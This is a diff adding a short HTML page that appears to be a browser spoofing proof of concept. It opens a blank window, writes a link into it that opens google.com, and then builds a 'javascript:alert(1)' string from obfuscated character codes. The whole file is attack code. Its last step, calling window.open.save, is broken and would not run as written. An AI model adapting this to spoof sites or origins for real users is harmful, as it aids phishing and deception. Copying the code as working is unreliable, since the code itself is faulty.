@@ -1,0 +1,34 @@
+
+<button onclick="spoof()">Klik 2x</button>
+
+<script>
+function spoof() {
+    const w = window.open("about:blank");
+
+    w.document.write(`
+        <a href="javascript:run()" style="font-size:100px;">Open</a>
+
+        <script>
+        function run() {
+            setTimeout(() => {
+                var t = window.open("https://google.com");
+            }, 250);
+
+            setTimeout(() => {
+            var pass = "javascript:" + String.fromCharCode(
+                97,108,101,114,116,40,49,41
+            );
+
+                window.open.save(pass);
+
+                function save(pass) {
+                    alert(pass);
+                }
+            }, 5000);
+        }
+        <\/script>
+    `);
+
+    w.document.close();
+}
+</script>
